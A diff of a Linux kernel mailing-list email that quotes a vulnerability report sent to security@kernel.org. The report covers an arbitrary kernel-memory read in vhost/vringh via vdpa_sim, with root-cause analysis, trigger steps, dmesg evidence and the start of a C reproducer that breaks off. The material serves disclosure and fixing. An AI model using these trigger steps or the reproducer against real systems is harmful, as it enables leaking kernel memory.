@@ -1,118 +1,676 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C978F2D781B;
-	Thu, 15 Oct 2026 07:36:23 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1792049785; cv=none; b=Q4d1A0ig+G8hw/bjphfRCTollviputiC9am4qkkCkPPaJVhgbvenVvKunIAM3OUZccptiOfv3U56Eh8XyHaTAsZJbngjDzlT8xXErMGbPdHsEXxbQ5lk6FwnDCpFewz2HXhvVVpg0h0cEYMT7NJbAcVa8a2+I8GiSdXA7Fr7yKg=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1792049785; c=relaxed/simple;
-	bh=i9FyIRQePbLqa9/r+2hlmQCarOIya8dUltNguuB4KIk=;
-	h=Message-ID:Date:MIME-Version:From:To:Subject:Content-Type; b=X6u2FPhZ+T9bMGJDUhUuVSRAdnuLZBk6UodKWp5efQzfJKPbsoaoorFLA10cBzGqrGpPYr6bIVpsjtB2Y7dCYJOFNWg1hVcvyW9QnRq8z3mZwuju7nw5DrhJq6ml1tGwEJPetR1Lj/rWy5Dg/fzy47IMTvh1ge1V5hcfWTherT4=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=b+rtfN2z; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8EB0C49DB9B
+	for <kvm@vger.kernel.org>; Thu, 15 Oct 2026 07:43:34 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=170.10.133.124
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1792050218; cv=pass; b=OKmIU2jW1oUMG021u6fpdyyVb9IYsOpCk6bMB7UfrDJc8j9bmolBEWxEDB2hgLteEJrTLfMFZfNsteO7sq7iuXjqaUcywYVkMUIkKy7VG6SK7JSDDTIvX+ylxZU8H6KcRnfUCWpZOJFSZr3XtQhFytfUT4JlMKdVYDj4+LNqfz0=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1792050218; c=relaxed/simple;
+	bh=1d/3Ghgeq6sJqjnIS5ExYotCeYUA/SZFQwG6Ry765ig=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=hnzfFySAQytrGWsKobdNl/UfiZ5JdLf0bptz497OCUmfETljE7HX1mUj5U+D8CfMrzkemG5bQcZSlC5yuJwQ5GHe6JhorOIeXnEDuhL/kIS7mGJV5kpL4pyTfUB1j+U4Hky8heRD9tLudKyA+ZB0atlQM/237gKn/hX4Jrm/FTY=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=UdTAM8gM; dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b=sQ7XmjmL; arc=pass smtp.client-ip=170.10.133.124
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="b+rtfN2z"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id B06711F000C4;
-	Thu, 15 Oct 2026 07:36:13 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1792049783;
-	bh=z4UeIwHQOxwYBLcVKwKbKO8z42PA/RkSXPeAr/0bJgM=;
-	h=Date:From:To:Subject;
-	b=b+rtfN2zttH776LAB46ZgXtroe3AHZU0pSdQoy+9dHyrLMGtejkPfBgo4WD63m3du
-	 fqYb2ysCRjxBTjuReLhQIDABshYxKcPf4sB2gDFqPWBJQNKEc97/HekCVltcprZonk
-	 XUO3WGFt7WGFHWbkx1hUv11Ah++luCQ5sLR7/FUzRyRLzXbsPPWUZm9busgd0btI0Q
-	 lbInucuL9M19T9lxQFavWqS4+XfBdSt9HwzOiPPIrDF8cUL2FQmNgkctjg/s/Q8OVE
-	 St88lIYUnFEBLn0VGPNjbbU383u2vEOphDu2O3eHzumM8VlDFfMGXaOnK5/IfYgx/4
-	 4WpLKICCWP+xw==
-Message-ID: <dbabaf78-cb48-409b-a7a2-3eb60ec06889@kernel.org>
-Date: Thu, 15 Oct 2026 09:36:10 +0200
+	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="UdTAM8gM";
+	dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b="sQ7XmjmL"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1792050213;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:in-reply-to:references:references;
+	bh=SURgaDWHeL0Law1pz7JqwRuD0Xq7Qze2dWuFTxM8M+I=;
+	b=UdTAM8gMB9AVbmqQzV2HXO2l0dclZjOFGtL4hfWAWFh0PudJiydIaIP51fJHbi+Va3e5Ea
+	FpBOJzzFMQGve48NqP7cBgueranY8aEqmcOLJ8VruiznW3ufXc2w7CYY19q/Fm1SnhW7gW
+	DuNoI2+NTkJHzE5+Sp/HR+dO8FoKhhE=
+Received: from mail-yx1-f70.google.com (mail-yx1-f70.google.com
+ [74.125.224.70]) by relay.mimecast.com with ESMTP with STARTTLS
+ (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
+ us-mta-222-YinglvoJPkGQw_IG7P463w-1; Thu, 15 Oct 2026 07:43:32 +0000
+X-MC-Unique: YinglvoJPkGQw_IG7P463w-1
+X-Mimecast-MFC-AGG-ID: YinglvoJPkGQw_IG7P463w_1792050211
+Received: by mail-yx1-f70.google.com with SMTP id 956f58d0204a3-677c2db10b1so2838876d50.1
+        for <kvm@vger.kernel.org>; Thu, 15 Oct 2026 00:43:31 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1792050211; cv=none;
+        d=google.com; s=arc-20260327;
+        b=IzDb0aWaq//YdTzRKgmT7sTWC3QYpiqSWI0+PGQ5KGLCT4eYZDrzL0UHzNFOn5RgRG
+         qJTmb2lMpVdAh1cWuWlViWHqyB6wDn6So5w3DdS0lB+F+F82LxbkZiCIuY7/kQw+If6Z
+         ccvS3UvJYyrsBCCmoVdlqatU8ZLRdjbqoTRHCe3zxtccsiiHuKWI7rZ7/LzRoxr9JBXa
+         Vdb7bda24/oiCqz+W5FJje0gUHw1A9HaGDWjiA7JlYrY7wobFEmUTvI2muJBFW5ArDVb
+         ghFTFTwbP00V/iazLG8f2cALyxbwphMh8OGHcUstOuQNc1pUGQTG+5AN/y0rQH+GzaAO
+         kPxA==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=SURgaDWHeL0Law1pz7JqwRuD0Xq7Qze2dWuFTxM8M+I=;
+        fh=AM8AXUqFxsqvVcp9GD/yW8r64NUANjbqSCqJzW1yCYM=;
+        b=XinWBztNJkgHupQVBJrugPMyuMH9fIaiX4R5WrCEjKlJM5ViTOD0L0lKnf9jUfi9cb
+         U4OGrC+HuBlvx4hDdpe2oJsRdm0k9Bo6khJyCY7qTA5zxyZiXI9Yn5h9ql4HiDrxYx4r
+         mjln8u4eeJjmcLFv0vsPw+2ZR7+LdBtqMn/vp8mS/ny2uaywQsIQtuzhI0d4t3xIE6Ej
+         PCuB1ehQsBzX1p3m0yn4HbS2FN8eOZGRaVQeg206zjueVsjUc1UfDjOrSylzG7Dzy4v4
+         F77fIaJlPo7wlvEpXCa5EQlFbC0iBZPX1nQefKc9KupJU15s1931HjGdc8AE2IxERWaC
+         JSPQ==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=redhat.com; s=google; t=1792050211; x=1792655011; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=SURgaDWHeL0Law1pz7JqwRuD0Xq7Qze2dWuFTxM8M+I=;
+        b=sQ7XmjmLYyrR2GCpSv0XOb3TSMikgKLPjzqCsPAbVW1GFhg9GVBzXVHIKlGrk0IqIn
+         vkOhY+2apYHO7QHBWdZ3wwh2K+f75ZS09pnc4fwA0vPugzjsPvMC1hBW/ABIVXLZJJHZ
+         qAALH+l8EYeA9U90gx0dQCMi6ow5I48H0nu21h40NtVjX7CfxhqWAGjdMvYQYRa+1c/O
+         xfNa/8AsT4o10EVXiJ9F6j5Q+G8yrRjbCn/nxqyyFhx6VVNpKeGvd3Czo0UtF1Yq8WFB
+         T2CH/uRlLF77FU9y0SlDRN7hf7a0l+OWp4oJodTFmN6fSVzUJrDIYMlqJ+fnKmMFhRkn
+         KyIg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1792050211; x=1792655011;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=SURgaDWHeL0Law1pz7JqwRuD0Xq7Qze2dWuFTxM8M+I=;
+        b=E/Jo4QGTeHg0g0PGUboxsNjJ9Z6kxFeRv1umYOj+G6IVVi6b8qAE89U4o+VRn8Zbrl
+         el7PDQonNG/NLSaRE+wlB5w6xwOw3Yg7G1VvPQ01CI6iLtY5KaUAICQuFOvAbl6h6P26
+         u7K1pF13vmYmvUPWEQtV3teR7X6lEHR0lVy1FOZVuvKAQmBtMcJ7jkTEUJ7PIwtywFFK
+         y6NsDnQ46fFJFkNvXgOc/PNSENrDtVFRKt9iaM05cT97z/n+7yZoljPMt0N5b7vFyTco
+         zJGlHLUSaf0bybgpmzqoglFKVGxLuuypdqdkK+jhcexUfz/BdqHsJ9OSrQLd5XV81kzG
+         4oaw==
+X-Forwarded-Encrypted: i=1; AKwUvBxyO7ZxB1xMHYwBTQ/dbAPWj+aUD/G6auvcrUkgYYL/0fPMiGyPkF9FlvNih26BAyUW4D4=@vger.kernel.org
+X-Gm-Message-State: AFq9FYLEDGT7xIh6chBJ9/JCUa0iDObLv7LxfJGos0H6OQFdvr0SxnvB
+	KBNVkgZ7ih75r/0TfYnzDVtRcxzCjpmCjF9JS5iWvrfg9OLWsyB04sqoBzbEjeMRBzxzwKth9/z
+	v2H3ywn5ru2Q9JoTPe+T+295gkX5eSjBaR/eK0uoItsu+8LPwM4KAwMEztSdkcErzpdshdwKcP9
+	iGae2fBz+20A6L3H2z8zVovvzaiGKlMTRp64yU
+X-Gm-Gg: AYBFou2GQ52wxUJ80E+s/Kspw1IEoqe8PUcYTLq3n0YKdTXcqMRy3m2Fx57VOISapbS
+	9NT8k9LTzwd6aEaUpTinvipxPgCVlD9oqthN8f3Oktxk3VIpxODHoClZchPpD7CKvQApaY+hiv8
+	XxvEhbfEQEtZn6SsfdCHsG0Es/wYGLl9RxTHFb3RbV2nQoL7TXdfa/T4nqrjlzMQBpyN1I9kgST
+	daM2qXvRuyA1uTOyKlPxQXo5xmstw5PSUo2hX0d9jYzAbE235Rfmsc1rLM=
+X-Received: by 2002:a05:690c:6e83:b0:8b0:a8ce:5794 with SMTP id 00721157ae682-8b0a8ce685bmr31929807b3.26.1792050211063;
+        Thu, 15 Oct 2026 00:43:31 -0700 (PDT)
+X-Received: by 2002:a05:690c:6e83:b0:8b0:a8ce:5794 with SMTP id
+ 00721157ae682-8b0a8ce685bmr31929647b3.26.1792050210457; Thu, 15 Oct 2026
+ 00:43:30 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: kvm@vger.kernel.org
 List-Id: <kvm.vger.kernel.org>
 List-Subscribe: <mailto:kvm+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:kvm+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-From: "David Hildenbrand (Arm)" <david@kernel.org>
-Content-Language: en-US
-To: "linux-coco@lists.linux.dev" <linux-coco@lists.linux.dev>,
- "linux-mm@kvack.org" <linux-mm@kvack.org>, KVM <kvm@vger.kernel.org>
-Subject: [Invitation] bi-weekly guest_memfd upstream call on 2026-10-15
-Autocrypt: addr=david@kernel.org; keydata=
- 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
- qIws/H2t
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+References: <6ad07f8a.a0c71a5e.2d2efd.977a@mx.google.com>
+In-Reply-To: <6ad07f8a.a0c71a5e.2d2efd.977a@mx.google.com>
+From: Eugenio Perez Martin <eperezma@redhat.com>
+Date: Thu, 15 Oct 2026 09:42:53 +0200
+X-Gm-Features: AclHuK_BxScBczrQcg0vhaO5Du6pZ7WUryfk-EONkyARKlqkA8I3ienPG4sL8Fw
+Message-ID: <CAJaqyWdGvi+P8y-HDeU0nK+zZDF2mN_TYE-Ma2m=2gNOY+R5Eg@mail.gmail.com>
+Subject: Re: [BUG] vhost/vringh: __get_user without access_ok leaks kernel
+ memory via vDPA passthrough
+To: Haoran Wang <haoranwangsec@gmail.com>
+Cc: mst@redhat.com, jasowangio@gmail.com, kvm@vger.kernel.org, 
+	virtualization@lists.linux.dev, netdev@vger.kernel.org, 
+	linux-kernel@vger.kernel.org, security@kernel.org
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-Hi,
+On Thu, Oct 15, 2026 at 9:24=E2=80=AFAM Haoran Wang <haoranwangsec@gmail.co=
+m> wrote:
+>
+> I'd like to report an issue in drivers/vhost/vringh.c:1216 (function
+> getu16_iotlb), found via static analysis of Linux 7.0.11 and verified
+> against the 7.2.10 source tree. I have reproduced the leak on an
+> unmodified 7.2.10 kernel.
+>
+> 1. Summary
+> getu16_iotlb() calls __get_user(tmp, (__virtio16 __user *)iov_base)
+> without an access_ok() check. iov_base originates from iotlb_translate(),
+> which only performs an IOTLB interval lookup (vhost_iotlb_itree_first) an=
+d
+> does not call access_ok(). In the vdpa_sim default passthrough mode the
+> entire address space is identity-mapped ([0, ULONG_MAX] -> 0), and
+> vdpasim_set_vq_address() stores the controller-supplied vring address
+> verbatim with no validation. A controller with CAP_NET_ADMIN can therefor=
+e
+> set a vring avail_user_addr to a kernel address. On a vq kick the vdpa_si=
+m
+> worker reads 2 bytes from that kernel address via __get_user (no
+> access_ok). Each vring iteration reads 2 bytes and the value is
+> repeatable, yielding an arbitrary-kernel-address 2-byte read. get_user()
+> would have rejected a kernel address via access_ok(), while__get_user() d=
+oes
+> not.
+>
+> 2. Vulnerable code
+> - File: drivers/vhost/vringh.c:1216 (unchanged in 7.2.10)
+> - Function: getu16_iotlb
+> - Misused API: __get_user
+>
+> ```c
+> /* drivers/vhost/vringh.c:1216 - getu16_iotlb (IOTLB read helper, per vri=
+ng iteration) */
+> if (vrh->use_va) {
+>         ret =3D __get_user(tmp, (__virtio16 __user *)ivec.iov.iovec[0].io=
+v_base); /* no access_ok */
+> }
+>
+> /* iov_base comes from iotlb_translate() (IOTLB lookup only, no access_ok=
+) */
+> /* drivers/vdpa/vdpa_sim/vdpa_sim.c:157-159 - passthrough identity-maps e=
+verything */
+> vhost_iotlb_add_range(&iommu, 0, ULONG_MAX, 0, VHOST_MAP_RW);
+> /* vdpa_sim.c:297 - set_vq_address stores the controller u64 verbatim, no=
+ validation */
+> vq->desc_addr =3D desc_area;   /* controller-controlled =3D kernel addres=
+s */
+> ```
+>
+> 3. Root cause
+> get_user() =3D access_ok() + __get_user(). __get_user() skips access_ok()
+> (it expands to __get_user_nocheck, which performs no check_range, whereas
+> get_user/put_user expand to the check_range-bearing variants that reject
+> kernel addresses). In the vhost-vdpa + vdpa_sim use_va path, the vring
+> addresses supplied by the controller (driver_addr/desc_addr) flow through
+> iotlb_translate(), which only does a vhost_iotlb_itree_first() interval
+> lookup. vdpa_sim's default passthrough IOTLB identity-maps the whole
+> address space, so any address passes the lookup. vdpasim_set_vq_address()
+> stores the controller's u64 with no user/kernel validation, and
+> vhost_vring_set_addr()'s access_ok is skipped in the vhost-vdpa path
+> because vq->private_data is never set. Consequently __get_user
+> dereferences an attacker-chosen kernel virtual address: the vdpa_sim
+> worker runs under kthread_use_mm() in the controller's mm with SMAP
+> disabled (STAC), and kernel addresses are mapped there, so 2 bytes of
+> kernel memory are read. With num=3D1, __vringh_get_head() sees head (the
+> leaked u16) >=3D 1 and calls vringh_bad(), which printk's the leaked valu=
+e
+> to dmesg, making the leak externally observable.
+>
+> 4. Affected versions
+> Present in: Linux 7.0.11. 7.2.10: still present, reproduced on 7.2.10 ker=
+nel.
+>
+> 5. Trigger / Preconditions
+> CAP_NET_ADMIN + vdpa_sim (CONFIG_VDPA_SIM / VDPA_SIM_BLOCK) + use_va mode=
+.
+> The controller creates a vdpasim device, binds its mm (VHOST_SET_OWNER,
+> enabling use_va), negotiates VIRTIO_F_ACCESS_PLATFORM, sets the vring
+> avail_user_addr to a kernel address, enables the vq, sets DRIVER_OK, and
+> kicks the vq. The worker then reads 2 bytes at the chosen kernel address.
+>
+> 6. Proof of Concept
+> Reproduced on Linux 7.2.10 tarball (config-only: CONFIG_KASAN=3Dy, VHOST_=
+VDPA=3Dy,
+> VDPA_SIM=3Dy, VDPA_SIM_BLOCK=3Dy). The trigger sets avail_user_addr =3D &=
+linux_banner
+> and reads avail->ring[0] (at banner+4). With num=3D1, the leaked u16 is p=
+rintk'd
+> by vringh_bad().
+>
+> Concrete reproduced evidence (7.2.10):
+> - dmesg: "vringh:" then "Guest says index 8312 > 1 is available"
+> - leaked value =3D 8312 =3D 0x2078 =3D linux_banner[4]=3D'x'(0x78) |
+>   (linux_banner[5]=3D' '(0x20) << 8)
+> - The expected value is independently computable from /proc/version (whic=
+h
+>   prints the same linux_banner): proc_version[4] | (proc_version[5] << 8)
+>   =3D 0x78 | 0x2000 =3D 0x2078 =3D 8312. The reproduced value MATCHES.
+> - Across 3 boots the banner *address* changed under KASLR
+>   (0xffffffff8b517280 / 0xffffffffa3f17280 / 0xffffffff90717280; the
+>   trigger resolves it at runtime via /proc/kallsyms), while the leaked
+>   *content* was 8312 every time. KASLR only randomizes the address, the 2
+>   bytes read there are constant.
+>
+> So a CAP_NET_ADMIN controller can read 2 bytes at an arbitrary kernel
+> virtual address by setting a vring avail_user_addr to that address and
+> kicking the vdpa_sim worker. The value is disclosed to dmesg via
+> vringh_bad(). This is an arbitrary-kernel-address 2-byte read on an
+> 7.2.10 kernel.
+>
+> Reproducer (vringh_leak.c) -- runs in the QEMU guest as root
+> (CAP_NET_ADMIN):
+>
+> ```c
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <unistd.h>
+> #include <fcntl.h>
+> #include <errno.h>
+> #include <stdint.h>
+> #include <sys/ioctl.h>
+> #include <sys/socket.h>
+> #include <sys/mman.h>
+> #include <linux/netlink.h>
+> #include <linux/genetlink.h>
+> #include <linux/vhost.h>
+> #include <linux/vdpa.h>
+> #include <sys/eventfd.h>
+>
+> #ifndef VHOST_VDPA
+> #define VHOST_VDPA 0xAF
+> #endif
+>
+> #ifndef VHOST_BACKEND_F_IOTLB_MSG_V2
+> #define VHOST_BACKEND_F_IOTLB_MSG_V2 0x1
+> #endif
+> #ifndef VHOST_BACKEND_F_IOTLB_BATCH
+> #define VHOST_BACKEND_F_IOTLB_BATCH 0x2
+> #endif
+> #ifndef VHOST_BACKEND_F_IOTLB_ASID
+> #define VHOST_BACKEND_F_IOTLB_ASID 0x3
+> #endif
+> #ifndef VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK
+> #define VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK 0x6
+> #endif
+>
+> static inline int nla_ok_(const struct nlattr *nla, int remaining)
+> {
+>         return remaining >=3D (int)sizeof(struct nlattr) &&
+>                nla->nla_len >=3D (int)sizeof(struct nlattr) &&
+>                nla->nla_len <=3D remaining;
+> }
+> static inline struct nlattr *nla_next_(const struct nlattr *nla, int *rem=
+aining)
+> {
+>         int tot =3D (int)NLA_ALIGN(nla->nla_len);
+>         *remaining -=3D tot;
+>         return (struct nlattr *)((char *)nla + tot);
+> }
+> static inline void *nla_data_(const struct nlattr *nla)
+> {
+>         return (char *)nla + NLA_HDRLEN;
+> }
+>
+> #ifndef VDPA_GENL_NAME
+> #define VDPA_GENL_NAME "vdpa"
+> #endif
+> #ifndef VDPA_GENL_VERSION
+> #define VDPA_GENL_VERSION 1
+> #endif
+> #ifndef VDPA_CMD_DEV_NEW
+> #define VDPA_CMD_DEV_NEW 3
+> #endif
+> #ifndef VDPA_CMD_DEV_DEL
+> #define VDPA_CMD_DEV_DEL 4
+> #endif
+> #ifndef VDPA_ATTR_MGMTDEV_DEV_NAME
+> #define VDPA_ATTR_MGMTDEV_DEV_NAME 2
+> #endif
+> #ifndef VDPA_ATTR_DEV_NAME
+> #define VDPA_ATTR_DEV_NAME 4
+> #endif
+>
+> #define die(fmt, ...) do { fprintf(stderr, "FATAL: " fmt "\n", ##__VA_ARG=
+S__); exit(1); } while (0)
+> #define xp(fmt, ...) do { int _e =3D errno; fprintf(stderr, "ERR " fmt " =
+(%s)\n", ##__VA_ARGS__, strerror(_e)); } while (0)
+>
+> static int nlsock;
+> static __u32 nlseq =3D 0;
+>
+> static int nla_put_str(struct nlmsghdr *nlh, int len, int type, const cha=
+r *s)
+> {
+>         struct nlattr { __u16 nla_len; __u16 nla_type; } *nla;
+>         int sl =3D (int)strlen(s) + 1;
+>         int pl =3D NLA_HDRLEN + sl;
+>         int pad =3D NLA_ALIGN(sl) - sl;
+>         if (NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl) > (size_t)len) re=
+turn -1;
+>         nla =3D (void *)nlh + NLMSG_ALIGN(nlh->nlmsg_len);
+>         nla->nla_len =3D (__u16)pl;
+>         nla->nla_type =3D (__u16)type;
+>         memcpy((char *)nla + NLA_HDRLEN, s, sl);
+>         nlh->nlmsg_len =3D NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl);
+>         (void)pad;
+>         return 0;
+> }
+>
+> static int genl_resolve_family(const char *name, __u16 *fam_id)
+> {
+>         char buf[1024];
+>         struct nlmsghdr *nlh =3D (void *)buf;
+>         struct genlmsghdr *gh;
+>         memset(buf, 0, sizeof(buf));
+>         nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
+>         nlh->nlmsg_type =3D GENL_ID_CTRL;
+>         nlh->nlmsg_flags =3D NLM_F_REQUEST;
+>         nlh->nlmsg_seq =3D ++nlseq;
+>         gh =3D NLMSG_DATA(nlh);
